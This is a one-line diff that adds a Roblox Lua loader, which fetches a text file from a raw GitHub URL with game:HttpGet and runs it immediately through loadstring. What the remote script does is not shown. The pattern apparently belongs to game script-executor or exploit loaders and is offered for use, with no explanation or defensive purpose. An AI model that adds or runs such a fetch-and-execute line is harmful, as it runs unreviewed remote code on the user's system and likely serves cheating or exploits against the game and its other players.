@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/UhGbaaaa/Android-Value/main/Bysuskhmer.txt'),true))()
